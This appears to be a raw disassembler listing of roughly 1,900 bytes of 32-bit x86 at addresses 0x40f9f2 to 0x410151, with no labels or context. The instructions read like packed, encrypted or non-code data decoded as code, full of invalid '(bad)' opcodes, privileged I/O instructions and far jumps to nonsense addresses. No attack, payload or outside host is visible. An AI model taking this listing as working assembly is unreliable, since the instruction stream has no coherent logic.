  40f9f2:	push   0xffffffe7
  40f9f4:	not    BYTE PTR [esi-0x62]
  40f9f7:	mov    dl,0xc1
  40f9f9:	pop    ebx
  40f9fa:	lea    ecx,[ebx+0x78df393]
  40fa00:	rol    DWORD PTR [edx+edi*1+0x1d],0x98
  40fa05:	xchg   edi,eax
  40fa06:	push   0x283bdef0
  40fa0b:	xchg   ebp,eax
  40fa0d:	jl     0x40f9e0
  40fa0f:	repz sbb DWORD PTR [ecx+0x1b471b24],edi
  40fa16:	es mov edx,0x4b1520a0
  40fa1c:	push   0x44
  40fa1e:	pop    ebp
  40fa1f:	push   ebp
  40fa20:	cmp    DWORD PTR [ecx],esp
  40fa22:	xchg   esi,eax
  40fa23:	pop    esi
  40fa24:	jmp    0x1ddd7358
  40fa29:	das    
  40fa2a:	std    
  40fa2b:	retf   0x7d11
  40fa2e:	setns  BYTE PTR [ebx+eax*2-0x188679a0]
  40fa36:	test   dl,bh
  40fa38:	dec    edx
  40fa39:	retf   
  40fa3a:	jo     0x40fa0d
  40fa3c:	sbb    al,0x73
  40fa3e:	rol    DWORD PTR [edi],cl
  40fa40:	pop    esi
  40fa41:	sti    
  40fa42:	(bad)  
  40fa43:	int    0x19
  40fa45:	test   eax,0xf6962eca
  40fa4a:	xor    ch,bl
  40fa4c:	pop    eax
  40fa4d:	fisub  WORD PTR [edx]
  40fa4f:	push   edi
  40fa50:	adc    DWORD PTR [edx],esp
  40fa52:	mov    cl,0x16
  40fa54:	(bad)  
  40fa55:	push   ss
  40fa56:	stc    
  40fa57:	dec    ecx
  40fa58:	pop    ebp
  40fa59:	adc    ebx,DWORD PTR [edi]
  40fa5b:	pop    ds
  40fa5c:	hlt    
  40fa5d:	mov    eax,edx
  40fa5f:	fbld   TBYTE PTR [eax]
  40fa61:	je     0x40fa6e
  40fa63:	vmread DWORD PTR [ecx+0x4a],ebp
  40fa67:	sub    edx,ebx
  40fa69:	sub    dh,ch
  40fa6b:	aam    0x84
  40fa6d:	stc    
  40fa6e:	dec    ebp
  40fa6f:	arpl   WORD PTR [edi],bx
  40fa71:	pop    ebp
  40fa72:	mov    bh,0x38
  40fa74:	dec    ebx
  40fa75:	imul   ebx,DWORD PTR ds:0x49cdae71,0x72ebd03b
  40fa7f:	and    eax,0x27183c60
  40fa84:	jmp    0x3a89:0x8f27ed1d
  40fa8b:	jno    0x40fa4e
  40fa8d:	mov    cl,0xec
  40fa8f:	mov    al,BYTE PTR [ebx-0x5a]
  40fa92:	cli    
  40fa93:	dec    edx
  40fa94:	loop   0x40faa5
  40fa96:	test   ch,dl
  40fa98:	ja     0x40faa6
  40fa9a:	cmp    bl,BYTE PTR [ebx]
  40fa9c:	call   0x5a191880
  40faa1:	fisubr WORD PTR [esi-0x1e11b7f0]
  40faa7:	out    0xa0,eax
  40faa9:	xor    al,0xe4
  40faab:	rcl    edx,cl
  40faad:	neg    DWORD PTR [ecx+ebp*2-0x46513fe4]
  40fab4:	or     edi,ebp
  40fab6:	and    BYTE PTR [ebx-0x27727f82],ch
  40fabc:	outs   dx,BYTE PTR ds:[esi]
  40fabd:	int    0x26
  40fabf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fac0:	jnp    0x40fb37
  40fac2:	cmp    BYTE PTR [edi],bh
  40fac4:	(bad)  
  40fac5:	retf   0x6595
  40fac8:	rcr    BYTE PTR ds:0x6c5ac4ba,1
  40face:	pop    eax
  40facf:	jecxz  0x40fad2
  40fad1:	push   es
  40fad2:	jno    0x40fb20
  40fad4:	fcom   DWORD PTR [ebx-0x55]
  40fad7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fad8:	sub    DWORD PTR [ecx],ebp
  40fada:	jb     0x40fb19
  40fadc:	xchg   esp,eax
  40fadd:	fnstenv [edx-0x23]
  40fae0:	push   ds
  40fae1:	jmp    0x40fa6e
  40fae3:	sub    DWORD PTR [ebp+0x578ca4c0],ebx
  40fae9:	add    al,0x7
  40faeb:	jge    0x40fb52
  40faed:	mov    ds:0x42138f0a,eax
  40faf2:	fdivr  QWORD PTR [eax+0x4e]
  40faf5:	stos   DWORD PTR es:[edi],eax
  40faf6:	clc    
  40faf7:	and    BYTE PTR [edx+0x414295f8],dh
  40fafd:	(bad)  
  40fafe:	icebp  
  40faff:	lods   al,BYTE PTR ds:[esi]
  40fb00:	nop
  40fb01:	stc    
  40fb02:	sub    eax,0x86dcb74e
  40fb07:	pop    eax
  40fb08:	out    0xd9,al
  40fb0a:	mov    cl,0x8c
  40fb0c:	repz jb 0x40fb2e
  40fb0f:	adc    BYTE PTR [ebp-0x7851d1a0],0x20
  40fb16:	leave  
  40fb17:	ret    0x1095
  40fb1a:	pop    ebx
  40fb1b:	dec    esp
  40fb1c:	ret    0x714
  40fb1f:	nop
  40fb20:	rcr    DWORD PTR [edx+ebp*4+0x4c],1
  40fb24:	inc    eax
  40fb25:	pop    edi
  40fb26:	adc    eax,0x376b9ee
  40fb2b:	sub    dl,BYTE PTR [edi]
  40fb2d:	pop    esi
  40fb2e:	mov    cs,ebx
  40fb30:	pop    ds
  40fb31:	mov    ds,WORD PTR [esi-0x12]
  40fb34:	fmul   QWORD PTR [ecx-0x12]
  40fb37:	mov    eax,0x26cff482
  40fb3c:	lds    edi,FWORD PTR [ebp+0x53]
  40fb3f:	cmp    edi,0x24
  40fb42:	repz or BYTE PTR [edi+0x2bd7dcc7],ch
  40fb49:	mov    ebx,0x512e15f3
  40fb4e:	das    
  40fb4f:	push   esp
  40fb50:	or     al,0x17
  40fb52:	or     al,0x47
  40fb54:	cmp    bl,BYTE PTR [ecx]
  40fb56:	jg     0x40fb45
  40fb58:	push   es
  40fb59:	scas   eax,DWORD PTR es:[edi]
  40fb5a:	jbe    0x40fb99
  40fb5c:	and    eax,0x9967c2d0
  40fb61:	test   eax,0x393dac8f
  40fb66:	inc    esp
  40fb67:	inc    esi
  40fb68:	xchg   ebx,eax
  40fb69:	out    0xab,al
  40fb6b:	or     eax,0x101eab43
  40fb70:	shl    eax,1
  40fb72:	(bad)  
  40fb73:	jmp    DWORD PTR [esi+0x610295e0]
  40fb79:	mov    ah,0x86
  40fb7b:	aad    0x58
  40fb7d:	xchg   DWORD PTR [esi],esp
  40fb7f:	(bad)  
  40fb80:	mov    ds:0x8fd64f98,eax
  40fb85:	in     al,0xba
  40fb87:	mov    esi,0x1c22f2aa
  40fb8c:	pop    eax
  40fb8d:	cmp    BYTE PTR [esi+edx*1+0x4b],cl
  40fb91:	nop
  40fb92:	rol    BYTE PTR [eax+0x38177c60],1
  40fb98:	repz sub DWORD PTR [ebx+0x32],ebp
  40fb9c:	jl     0x40fb5c
  40fb9e:	outs   dx,DWORD PTR ds:[esi]
  40fb9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fba0:	hlt    
  40fba1:	pusha  
  40fba2:	cwde   
  40fba3:	sub    BYTE PTR [edx+0x251e87c0],al
  40fba9:	leave  
  40fbaa:	in     eax,0x17
  40fbac:	rcl    BYTE PTR [edi-0x4a981a8c],0x28
  40fbb3:	jmp    0x58054380
  40fbb8:	mul    BYTE PTR [edx+0x494d2f10]
  40fbbe:	(bad)  
  40fbbf:	pop    edi
  40fbc0:	mov    al,ds:0x74b25356
  40fbc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbc6:	adc    DWORD PTR [ebx-0x2],edi
  40fbc9:	mov    eax,ds:0xe98f1453
  40fbce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbcf:	loop   0x40fb9f
  40fbd1:	enter  0xd77f,0xe7
  40fbd5:	push   ebp
  40fbd6:	daa    
  40fbd7:	(bad)  
  40fbd8:	xor    dh,BYTE PTR [ebx]
  40fbda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbdb:	cmp    DWORD PTR [esi+0x10],ebp
  40fbde:	ret    
  40fbdf:	nop
  40fbe0:	loop   0x40fb6f
  40fbe2:	sub    BYTE PTR [esi+0x43bb09ec],cl
  40fbe8:	sub    al,0x56
  40fbea:	dec    ecx
  40fbeb:	test   dh,0x6e
  40fbee:	mov    eax,ds:0x61abeb9d
  40fbf3:	xor    al,al
  40fbf5:	iret   
  40fbf6:	add    BYTE PTR [ebx+0x6a],al
  40fbf9:	xor    DWORD PTR [ebx],0xffffff91
  40fbfc:	call   0xb990f6e4
  40fc01:	das    
  40fc02:	out    dx,al
  40fc03:	adc    bh,al
  40fc05:	rol    BYTE PTR [edx+0x6d],cl
  40fc08:	sub    eax,0xd8fcd5f4
  40fc0d:	out    0xc,eax
  40fc0f:	sub    al,0x9c
  40fc11:	in     eax,dx
  40fc12:	sbb    al,bl
  40fc14:	push   eax
  40fc15:	inc    edi
  40fc16:	repnz out 0x1c,eax
  40fc19:	into   
  40fc1a:	(bad)  
  40fc1b:	ss jecxz 0x40fbaf
  40fc1e:	mov    ch,0x8d
  40fc20:	rcl    DWORD PTR [esi+0x26],1
  40fc23:	inc    ebp
  40fc24:	mov    bl,0xeb
  40fc26:	sbb    ebp,edi
  40fc28:	test   BYTE PTR [eax-0x19],0x9e
  40fc2c:	in     eax,0xe9
  40fc2e:	cdq    
  40fc2f:	mov    dh,0x3f
  40fc31:	pop    esi
  40fc32:	(bad)  
  40fc33:	neg    DWORD PTR [esi-0x5b509ef3]
  40fc39:	add    ecx,DWORD PTR [ecx-0x66]
  40fc3c:	fidivr DWORD PTR [esi]
  40fc3e:	lods   eax,DWORD PTR ds:[esi]
  40fc3f:	retf   
  40fc40:	push   esp
  40fc41:	das    
  40fc42:	aam    0x8d
  40fc44:	sahf   
  40fc45:	es cmp ah,al
  40fc48:	clc    
  40fc49:	inc    ebp
  40fc4a:	inc    ecx
  40fc4b:	xchg   ecx,eax
  40fc4c:	aas    
  40fc4d:	pop    edi
  40fc4e:	(bad)  
  40fc4f:	pop    ebp
  40fc50:	xchg   ch,al
  40fc52:	and    DWORD PTR ds:0x64c79aad,edi
  40fc58:	adc    ch,BYTE PTR [ecx-0x3d]
  40fc5b:	test   BYTE PTR [ecx+edi*4-0x22],bh
  40fc5f:	jmp    0x40fbe1
  40fc61:	cmp    eax,0x911c870
  40fc66:	adc    eax,0x695796c1
  40fc6b:	xor    dl,0x2b
  40fc6e:	cmp    eax,0x2bf414b9
  40fc73:	fdiv   DWORD PTR [eax-0x5f471ef8]
  40fc79:	push   cs
  40fc7a:	fld    QWORD PTR [edx+0x287e1056]
  40fc80:	loopne 0x40fc15
  40fc82:	or     edi,ebx
  40fc84:	stos   BYTE PTR es:[edi],al
  40fc85:	add    eax,esp
  40fc87:	adc    cl,BYTE PTR [edx]
  40fc89:	pop    esi
  40fc8a:	lock pop eax
  40fc8c:	scas   al,BYTE PTR es:[edi]
  40fc8d:	push   edx
  40fc8e:	aaa    
  40fc8f:	or     DWORD PTR [ebx+0x78b0c292],eax
  40fc95:	or     edi,DWORD PTR [edi]
  40fc97:	js     0x40fc62
  40fc99:	dec    ecx
  40fc9a:	daa    
  40fc9b:	ror    dh,cl
  40fc9d:	gs jo  0x40fc39
  40fca0:	pop    ds
  40fca1:	dec    ebx
  40fca2:	or     BYTE PTR [ecx+0x65],0xc2
  40fca6:	retf   
  40fca7:	inc    ecx
  40fca8:	mov    WORD PTR [ebx+esi*2+0x72208f02],es
  40fcaf:	mov    bl,0x3c
  40fcb1:	popf   
  40fcb2:	dec    DWORD PTR [eax-0x2e011860]
  40fcb8:	sbb    DWORD PTR [eax],esp
  40fcba:	nop
  40fcbb:	add    cl,BYTE PTR [eax]
  40fcbd:	js     0x40fca2
  40fcbf:	mov    BYTE PTR [edi],bl
  40fcc1:	pop    esp
  40fcc2:	es ret 0x1582
  40fcc6:	jp     0x40fd2f
  40fcc8:	inc    esp
  40fcc9:	xor    DWORD PTR [ecx],ecx
  40fccb:	mov    al,ds:0xdd4f9e35
  40fcd0:	jmp    0x40fd32
  40fcd2:	cmp    eax,0x3d442d4c
  40fcd7:	adc    eax,0xc16ccfe9
  40fcdc:	jo     0x40fd35
  40fcde:	jb     0x40fcd3
  40fce0:	lock test al,0x1b
  40fce3:	xor    al,0xfd
  40fce5:	pushf  
  40fce6:	pcmpeqd mm2,QWORD PTR [edi-0x60]
  40fcea:	mov    ds:0xfe63a805,al
  40fcef:	adc    dh,al
  40fcf1:	push   ds
  40fcf2:	dec    ecx
  40fcf3:	pop    ebx
  40fcf4:	mov    ch,BYTE PTR [ebx-0x71a2c060]
  40fcfa:	sbb    ah,BYTE PTR [esi]
  40fcfc:	repz aad 0xc0
  40fcff:	jecxz  0x40fd4a
  40fd01:	sbb    al,0x9b
  40fd03:	les    edx,FWORD PTR [ecx]
  40fd05:	jp     0x40fcd8
  40fd07:	fiadd  DWORD PTR [edi+0x28d89696]
  40fd0d:	js     0x40fd45
  40fd0f:	jecxz  0x40fd00
  40fd11:	inc    esi
  40fd12:	adc    BYTE PTR [ecx-0x1],cl
  40fd15:	aas    
  40fd16:	inc    esi
  40fd17:	xlat   BYTE PTR ds:[ebx]
  40fd18:	imul   ebx,ebp,0x2
  40fd1b:	dec    ecx
  40fd1c:	mov    ah,0xe0
  40fd1e:	shl    BYTE PTR [edx-0x22],1
  40fd21:	clc    
  40fd22:	dec    edi
  40fd23:	xor    al,BYTE PTR [edx]
  40fd25:	imul   BYTE PTR [eax-0x8]
  40fd28:	xchg   DWORD PTR [edx+0x65],ebp
  40fd2b:	sub    al,0xe7
  40fd2d:	ja     0x40fd97
  40fd2f:	loop   0x40fd2f
  40fd31:	mov    BYTE PTR [edx-0x10],0x7f
  40fd35:	loopne 0x40fda9
  40fd37:	inc    ebp
  40fd38:	cld    
  40fd39:	sar    BYTE PTR fs:[edi-0x7dfd4038],cl
  40fd40:	iret   
  40fd41:	les    edi,FWORD PTR [esi-0x4866d17e]
  40fd47:	pop    ecx
  40fd48:	pop    ebx
  40fd49:	in     eax,dx
  40fd4a:	sahf   
  40fd4b:	push   0x78970d50
  40fd50:	pop    ds
  40fd51:	and    ebp,DWORD PTR [ebx-0x3bb7bf]
  40fd57:	mov    edi,0x11e0a2be
  40fd5c:	or     ch,bh
  40fd5e:	into   
  40fd5f:	push   ds
  40fd60:	ror    eax,cl
  40fd62:	ret    
  40fd63:	adc    DWORD PTR [ebx],ebx
  40fd65:	xchg   esi,eax
  40fd66:	gs mov dl,0x86
  40fd69:	cmp    BYTE PTR [esi+0x63],bh
  40fd6c:	(bad)  
  40fd6d:	retf   0xd8f9
  40fd70:	ss mov ebp,0x91b83cfc
  40fd76:	aas    
  40fd77:	dec    esi
  40fd78:	dec    edi
  40fd79:	xor    ebp,DWORD PTR [esi+0x21]
  40fd7c:	inc    ebx
  40fd7d:	fidivr WORD PTR [ebx-0x21]
  40fd80:	cmp    al,0x16
  40fd82:	sub    DWORD PTR [ecx],0xffffffcd
  40fd85:	ds pop ecx
  40fd87:	enter  0xca9c,0xc4
  40fd8b:	push   0xfffffff2
  40fd8d:	loop   0x40fd78
  40fd8f:	jle    0x40fe0c
  40fd91:	stc    
  40fd92:	sti    
  40fd93:	fdivr  DWORD PTR [edi]
  40fd95:	jmp    0xb084:0xc11543f0
  40fd9c:	jbe    0x40fe0d
  40fd9e:	jmp    0xc16a:0xdc1d8fdc
  40fda5:	push   edx
  40fda6:	pop    ebp
  40fda7:	mov    dl,0xad
  40fda9:	sub    eax,ebx
  40fdab:	(bad)
  40fdae:	in     al,0x53
  40fdb0:	mul    DWORD PTR [ebp-0x57]
  40fdb3:	scas   eax,DWORD PTR es:[edi]
  40fdb4:	and    ch,BYTE PTR [ecx]
  40fdb6:	and    al,0xa8
  40fdb8:	mov    ch,0x42
  40fdba:	or     BYTE PTR [ebp+0x2422a2d4],0xd6
  40fdc1:	outs   dx,DWORD PTR ds:[esi]
  40fdc2:	lods   eax,DWORD PTR ds:[esi]
  40fdc3:	pop    ecx
  40fdc4:	xor    ch,ah
  40fdc6:	pop    esp
  40fdc7:	pusha  
  40fdc8:	ret    
  40fdc9:	in     al,dx
  40fdca:	adc    edi,edx
  40fdcc:	jo     0x40fd6f
  40fdce:	outs   dx,BYTE PTR ds:[esi]
  40fdcf:	sbb    al,0x6a
  40fdd1:	scas   al,BYTE PTR es:[edi]
  40fdd2:	pushw  0xffe5
  40fdd5:	mov    ds:0xcc23b8c9,al
  40fdda:	mov    esi,0x2534ff35
  40fddf:	push   edi
  40fde0:	dec    esp
  40fde1:	dec    ebx
  40fde2:	das    
  40fde3:	adc    BYTE PTR [ebx-0x5acc35ac],bh
  40fde9:	sub    DWORD PTR [ecx+0x42f99acb],0x8bc21f6f
  40fdf3:	push   cs
  40fdf4:	inc    ecx
  40fdf5:	imul   ebp,DWORD PTR [ecx+0x31cfc750],0xffffffb8
  40fdfc:	into   
  40fdfd:	out    0xd8,al
  40fdff:	mov    al,0x7a
  40fe01:	inc    edx
  40fe02:	leave  
  40fe03:	jae    0x40fe00
  40fe05:	repnz push es
  40fe07:	in     al,0x89
  40fe09:	sbb    eax,0xc934b9a3
  40fe0e:	mov    esp,0xb9be1657
  40fe13:	shr    BYTE PTR [edx+0x3531911],0xb
  40fe1a:	loope  0x40fe02
  40fe1c:	xor    al,0xa0
  40fe1e:	fucom  st(3)
  40fe20:	jp     0x40fe6c
  40fe22:	and    BYTE PTR [eax-0x6],0x27
  40fe26:	mov    cl,0x94
  40fe28:	xchg   esp,eax
  40fe29:	mov    esi,DWORD PTR [esp+ebp*8+0x77ce4a1d]
  40fe30:	cli    
  40fe31:	push   ebp
  40fe32:	retf   0x1fcf
  40fe35:	mov    cl,0x80
  40fe37:	sub    cl,BYTE PTR [esi-0x73]
  40fe3a:	ins    DWORD PTR es:[edi],dx
  40fe3b:	ror    ch,cl
  40fe3d:	sti    
  40fe3e:	call   0xcd98:0x410001be
  40fe45:	jo     0x40fe6e
  40fe47:	stc    
  40fe48:	hlt    
  40fe49:	dec    esi
  40fe4a:	outs   dx,DWORD PTR ds:[esi]
  40fe4b:	cs jae 0x40fe3e
  40fe4e:	or     al,0xc2
  40fe50:	lds    edx,FWORD PTR [eax]
  40fe52:	mov    bh,0x54
  40fe54:	cdq    
  40fe55:	clc    
  40fe56:	fadd   QWORD PTR ds:0xa85ee01a
  40fe5c:	int    0x28
  40fe5e:	test   BYTE PTR [esi],al
  40fe60:	sbb    eax,0x9f80de11
  40fe65:	mov    ecx,0x8bfdb2f7
  40fe6a:	inc    edx
  40fe6b:	popa   
  40fe6c:	ror    bh,0xc6
  40fe6f:	jb     0x40fe51
  40fe71:	lods   al,BYTE PTR ds:[esi]
  40fe72:	mul    DWORD PTR [eax+0x48]
  40fe75:	stos   BYTE PTR es:[edi],al
  40fe76:	ins    BYTE PTR es:[edi],dx
  40fe77:	test   ebx,ebx
  40fe79:	mov    ebx,0x6ad50a89
  40fe7e:	xchg   ebx,eax
  40fe7f:	int3   
  40fe80:	ds push 0x22
  40fe83:	pop    eax
  40fe84:	leave  
  40fe85:	adc    eax,0xc3272307
  40fe8a:	inc    edx
  40fe8b:	fadd   st(5),st
  40fe8d:	xor    BYTE PTR [ecx-0x21],dl
  40fe90:	xor    esi,edi
  40fe92:	cld    
  40fe93:	pop    es
  40fe94:	push   edx
  40fe95:	inc    eax
  40fe96:	in     al,0xa0
  40fe98:	xor    eax,0xa1a2317
  40fe9d:	inc    edi
  40fe9e:	out    dx,al
  40fe9f:	mov    WORD PTR [edx-0x6f],gs
  40fea2:	jmp    0xc9178b56
  40fea7:	jnp    0x40fe64
  40fea9:	std    
  40feaa:	bound  ebx,QWORD PTR [ebx]
  40feac:	rcr    ch,0x35
  40feaf:	pop    edi
  40feb0:	ins    DWORD PTR es:[edi],dx
  40feb1:	sbb    DWORD PTR [esi+0x3a],esp
  40feb4:	mov    bl,0x32
  40feb6:	push   ecx
  40feb7:	lahf   
  40feb8:	into   
  40feb9:	mov    ecx,0xd7d2fb40
  40febe:	and    ebp,DWORD PTR [edi+0xa]
  40fec1:	test   BYTE PTR [eax-0x6e7de99d],bh
  40fec7:	les    esi,FWORD PTR [ebp-0x2ddfedb3]
  40fecd:	xchg   ebp,eax
  40fece:	mov    bl,0x22
  40fed0:	pop    ebx
  40fed1:	cmp    BYTE PTR [si+0x470],dh
  40fed6:	push   esi
  40fed7:	mov    edi,0xb9c6675d
  40fedc:	in     al,dx
  40fedd:	dec    edi
  40fede:	aaa    
  40fedf:	mov    eax,0x25f777ad
  40fee4:	fcomp  QWORD PTR [edx]
  40fee6:	int    0xa5
  40fee8:	in     eax,dx
  40fee9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40feea:	pop    ds
  40feeb:	(bad)  
  40feec:	mov    dl,0x2a
  40feee:	dec    ecx
  40feef:	imul   edx,edx,0x58c03570
  40fef5:	xchg   edi,eax
  40fef6:	jnp    0x40fe90
  40fef8:	and    ebx,DWORD PTR [ecx]
  40fefa:	pop    ebp
  40fefb:	jno    0x40ff2c
  40fefd:	mov    dh,0xbc
  40feff:	sub    al,0x33
  40ff01:	add    cl,bh
  40ff03:	adc    al,0x5e
  40ff05:	mov    bh,0x49
  40ff07:	mov    al,0x63
  40ff09:	ret    0x6907
  40ff0c:	xchg   ebp,eax
  40ff0d:	adc    DWORD PTR [edx+0x4f0c856f],ebp
  40ff13:	mov    al,ds:0xd180189e
  40ff18:	test   al,0x50
  40ff1a:	jg     0x40ff19
  40ff1c:	mov    eax,0xaa9b49db
  40ff21:	pop    edi
  40ff22:	stos   DWORD PTR es:[edi],eax
  40ff23:	jmp    0xbaa80884
  40ff28:	dec    ecx
  40ff29:	push   ebp
  40ff2a:	sar    BYTE PTR [ebx*4+0x28e606e8],1
  40ff31:	xor    al,0x54
  40ff33:	nop
  40ff34:	hlt    
  40ff35:	stos   BYTE PTR es:[edi],al
  40ff36:	call   0xd780:0x90445a77
  40ff3d:	mov    dl,0x1e
  40ff3f:	jmp    0xb33b:0x208bcc12
  40ff46:	push   0x7d89538c
  40ff4b:	lock (bad) 
  40ff4d:	cs xchg esi,eax
  40ff4f:	jp     0x40fed2
  40ff51:	sbb    edi,DWORD PTR [eax-0x68af09ca]
  40ff57:	mov    cs,WORD PTR [edi+0x14240afe]
  40ff5d:	jno    0x40ff5b
  40ff5f:	sub    dh,dl
  40ff61:	push   ds
  40ff62:	les    edx,FWORD PTR [eax-0x5b]
  40ff65:	and    ebx,ecx
  40ff67:	cs push esp
  40ff69:	and    al,0x3e
  40ff6b:	mov    eax,0xd9a6d2a5
  40ff70:	popf   
  40ff71:	cmp    BYTE PTR [ebp+0x154d9f3e],dl
  40ff77:	shr    dh,0x2f
  40ff7a:	cmp    eax,0xc04d333b
  40ff7f:	aad    0x6e
  40ff81:	jae    0x40ff94
  40ff83:	and    eax,DWORD PTR [eax]
  40ff85:	mov    dh,0xfa
  40ff87:	or     bl,bl
  40ff89:	ror    DWORD PTR [ebp+0x2d],0xde
  40ff8d:	scas   eax,DWORD PTR es:[edi]
  40ff8e:	and    esp,ecx
  40ff90:	int3   
  40ff91:	sub    eax,0x53170958
  40ff96:	test   al,0xa1
  40ff98:	and    ah,BYTE PTR [edi+0x1]
  40ff9b:	les    ebx,FWORD PTR [ebx+ebp*4]
  40ff9e:	xor    al,0xf2
  40ffa0:	xor    bh,BYTE PTR [eax+0x1d0650e1]
  40ffa6:	je     0x40ff7f
  40ffa8:	xchg   esp,eax
  40ffa9:	mov    dl,0xf9
  40ffab:	and    al,0xce
  40ffad:	pop    esp
  40ffae:	test   al,0xe6
  40ffb0:	pop    ebx
  40ffb1:	and    ebx,DWORD PTR [edi+0x64]
  40ffb4:	mov    dl,0xbb
  40ffb6:	cmc    
  40ffb7:	loopne 0x40ffab
  40ffb9:	popf   
  40ffba:	push   ebp
  40ffbb:	enter  0x4d98,0xa3
  40ffbf:	dec    edi
  40ffc0:	sti    
  40ffc1:	mov    esp,esp
  40ffc3:	push   ss
  40ffc4:	add    DWORD PTR [edx],0x0
  40ffc7:	cli    
  40ffc8:	xor    ebp,edi
  40ffca:	mov    ebx,0x9e0fc243
  40ffcf:	jmp    esi
  40ffd1:	and    bh,BYTE PTR [edi+0x4a28be89]
  40ffd7:	and    ecx,edi
  40ffd9:	jbe    0x40ff97
  40ffdb:	mov    DWORD PTR [eax-0x3f46a369],esi
  40ffe1:	or     al,0xf2
  40ffe3:	test   BYTE PTR [eax+0x53],dl
  40ffe6:	add    eax,0xa72ee29a
  40ffeb:	push   edx
  40ffec:	push   ecx
  40ffed:	sub    esi,0x67
  40fff0:	aaa    
  40fff1:	cmp    eax,DWORD PTR [edi+0x6a]
  40fff4:	lods   al,BYTE PTR ds:[esi]
  40fff5:	mov    dh,0x8b
  40fff7:	pop    edx
  40fff8:	inc    ebx
  40fff9:	hlt    
  40fffa:	mov    dl,0x58
  40fffc:	test   BYTE PTR ss:[esi],dl
  40ffff:	cmc    
  410000:	mov    edi,0xae173fdb
  410005:	mov    ss,WORD PTR [ebx]
  410007:	and    BYTE PTR ds:[edi-0x7b],ch
  41000b:	cmc    
  41000c:	jne    0x410039
  41000e:	fsub   DWORD PTR [eax-0x66638fb]
  410014:	je     0x40ffb5
  410016:	xchg   esp,esp
  410018:	adc    al,0x86
  41001a:	jno    0x410011
  41001c:	aas    
  41001d:	sbb    eax,0x9deeda4f
  410022:	inc    ebx
  410023:	stc    
  410024:	sbb    al,0x1e
  410026:	enter  0x575b,0x6b
  41002a:	push   ebp
  41002b:	popf   
  41002c:	push   cs
  41002d:	call   0x6dd1:0x7760747c
  410034:	xor    BYTE PTR [ebp-0x27c28b13],dl
  41003a:	out    0xc2,eax
  41003c:	in     al,0x38
  41003e:	stos   BYTE PTR es:[edi],al
  41003f:	lods   eax,DWORD PTR ds:[esi]
  410040:	in     eax,dx
  410041:	jmp    0x40fff7
  410043:	sbb    DWORD PTR [edi-0x4d],0x34
  410047:	xchg   ecx,eax
  410048:	daa    
  410049:	lods   eax,DWORD PTR gs:[esi]
  41004b:	jno    0x410006
  41004d:	dec    esi
  41004e:	cdq    
  41004f:	mov    dl,0xf8
  410051:	push   ebx
  410052:	jo     0x41009a
  410054:	mov    DWORD PTR [bp+di-0x2dc7],esp
  410059:	sub    al,0x97
  41005b:	pop    esi
  41005c:	mov    edi,0xfed817d3
  410061:	push   ds
  410062:	daa    
  410063:	mov    dh,0xac
  410065:	xor    edi,DWORD PTR [ebx+0x4d08a92c]
  41006b:	xchg   ebx,eax
  41006c:	cs hlt 
  41006e:	xchg   ebp,eax
  41006f:	and    ah,BYTE PTR [ebp+0x64]
  410072:	push   edi
  410073:	xchg   BYTE PTR [eax],dh
  410075:	pop    ebx
  410076:	clc    
  410077:	in     eax,dx
  410078:	scas   al,BYTE PTR es:[edi]
  410079:	mov    esp,edx
  41007b:	dec    ebx
  41007c:	mov    ecx,DWORD PTR ds:0xa21433d4
  410082:	push   cs
  410083:	fisubr WORD PTR [ecx+0x7a735da3]
  410089:	jmp    0x410051
  41008b:	out    0x7d,al
  41008d:	test   eax,0x3ea8cbbb
  410092:	nop
  410093:	div    edi
  410095:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410097:	mov    ebx,0x3f3272
  41009c:	outs   dx,DWORD PTR ds:[esi]
  41009d:	mov    esp,0xa8d6123
  4100a2:	mov    WORD PTR [eax],?
  4100a4:	stc    
  4100a5:	das    
  4100a6:	inc    ebx
  4100a7:	shl    BYTE PTR [ecx],cl
  4100a9:	xor    eax,0xf1d9a431
  4100ae:	xchg   esp,eax
  4100af:	sbb    eax,0xab94cdd9
  4100b4:	mov    edx,0xa5ef3f84
  4100b9:	addr16 data16 mov bl,0x4d
  4100bd:	mov    ch,0xe2
  4100bf:	test   al,0x83
  4100c1:	(bad)  
  4100c2:	(bad)  ds:0x311281df
  4100c8:	cld    
  4100c9:	aad    0xe
  4100cb:	push   ss
  4100cc:	jg     0x4100d8
  4100ce:	shr    BYTE PTR [eax-0x6d],cl
  4100d1:	jmp    0x1c57:0x5bb6c144
  4100d8:	mov    esi,0x3dd2c372
  4100dd:	aaa    
  4100de:	push   ecx
  4100df:	dec    edi
  4100e0:	sbb    dl,bh
  4100e2:	sbb    dh,BYTE PTR [ebx-0x48]
  4100e5:	retf   
  4100e6:	mov    eax,0x25fc5cb6
  4100eb:	rcr    BYTE PTR [ebp-0x232bc978],0xe6
  4100f2:	adc    eax,DWORD PTR [edx-0x39a9131]
  4100f8:	pop    edi
  4100f9:	hlt    
  4100fa:	pushf  
  4100fb:	pop    ebp
  4100fc:	fidivr WORD PTR [esi]
  4100fe:	fnstenv [esi+ebp*4+0x677f5434]
  410105:	outs   dx,DWORD PTR ds:[esi]
  410106:	into   
  410107:	push   cs
  410108:	dec    esi
  410109:	push   ecx
  41010a:	jae    0x410148
  41010c:	or     al,0xb6
  41010e:	out    0x2,al
  410110:	xchg   esi,eax
  410111:	out    0xfc,eax
  410113:	sbb    cl,cl
  410115:	or     BYTE PTR [esi],bl
  410117:	pop    eax
  410118:	icebp  
  410119:	cs daa 
  41011b:	pop    edi
  41011c:	push   esi
  41011d:	daa    
  41011e:	pop    ecx
  41011f:	mov    BYTE PTR [edi],al
  410121:	push   edx
  410122:	dec    edx
  410123:	xor    eax,0xaeb61523
  410128:	mov    ?,WORD PTR [eiz*2-0x25b6ccaa]
  41012f:	aaa    
  410130:	lods   al,BYTE PTR ds:[esi]
  410131:	adc    bl,BYTE PTR ds:0x6c198436
  410137:	fwait
  410138:	push   ecx
  410139:	dec    ebx
  41013a:	jmp    0x4de2:0x67671669
  410141:	or     al,0xec
  410143:	ss fdivrp st(1),st
  410146:	icebp  
  410147:	mov    cl,0x7c
  410149:	mov    al,ds:0x1e463033
  41014e:	ror    BYTE PTR [esi],1
  410150:	inc    ecx
  410151:	es je  0x4100e5
